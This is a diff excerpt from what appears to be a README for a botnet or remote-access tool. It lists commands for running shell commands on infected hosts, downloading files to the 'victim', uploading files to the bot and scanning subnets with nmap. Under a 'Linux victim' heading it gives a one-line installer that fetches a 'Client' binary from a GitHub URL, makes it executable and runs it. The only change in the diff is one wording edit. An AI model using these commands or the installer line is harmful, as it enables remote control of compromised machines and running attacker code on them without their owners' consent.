@@ -39,7 +39,7 @@ bnt: @udbnt
 * !shell.< HOSTNAME >@< IP > < CMD >             (Run command)
 * !download.< HOSTNAME > < IP > < URL > < NAME > (Download file to victim)
 * !upload.< HOSTNAME >@< IP > < PATH >           (Upload file to bot)
-* !nmap.< HOSTNAME >@< IP >                      (Nmap subnet scan)
+* !nmap.< HOSTNAME >@< IP >                      (Nmap detailed subnet scan)
 
 # Linux victim
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
